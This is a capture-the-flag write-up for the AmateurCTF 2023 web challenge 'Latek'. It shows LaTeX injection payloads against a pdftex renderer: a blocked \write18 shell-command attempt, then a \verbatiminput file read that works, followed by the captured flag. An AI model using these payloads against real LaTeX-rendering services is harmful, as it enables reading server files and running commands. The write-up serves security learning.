---
title: AmateurCTF '23 - Web - Latek
date: '2023-07-18'
tags: ['ctf', 'web', 'amateurctf', 'amateurctf23', 'writeup', 'lfi', 'latex', 'pdftex']
draft: false
summary: Utilizing Latex to read files from the local system.
---

## Challenge Description

bryanguo (not associated with the ctf), keeps saying it's pronouced latek not latex like the glove material. anyways i made this simple app so he stops paying for overleaf.

Note: flag is ONLY at `/flag.txt`

Author: smashmaster

Connection info: [latek.amt.rs](https://latek.amt.rs)

## Solution

Visting the website, we're greeted with the following

![chal](/static/writeups/amateurctf2023/web/latek-0.png)

We can see, that the code is using `pdftex` to render the latex. Let's try to read the flag using the following payload

```latex
\documentclass{article}
\begin{document}
\immediate\write18{cat /flag.txt}
\end{document}
```

![chal](/static/writeups/amateurctf2023/web/latek-1.png)

Well, we can see that `\write18` is blocked. I tried searching for different ways on [hacktricks](https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection) and the following payload worked

```latex
\documentclass{article}
\usepackage{verbatim}
\begin{document}
\verbatiminput{/flag.txt}
\end{document}
```

![chal](/static/writeups/amateurctf2023/web/latek-2.png)

Flag: `amateursCTF{th3_l0w_budg3t_and_n0_1nstanc3ing_caus3d_us_t0_n0t_all0w_rc3_sadly}`
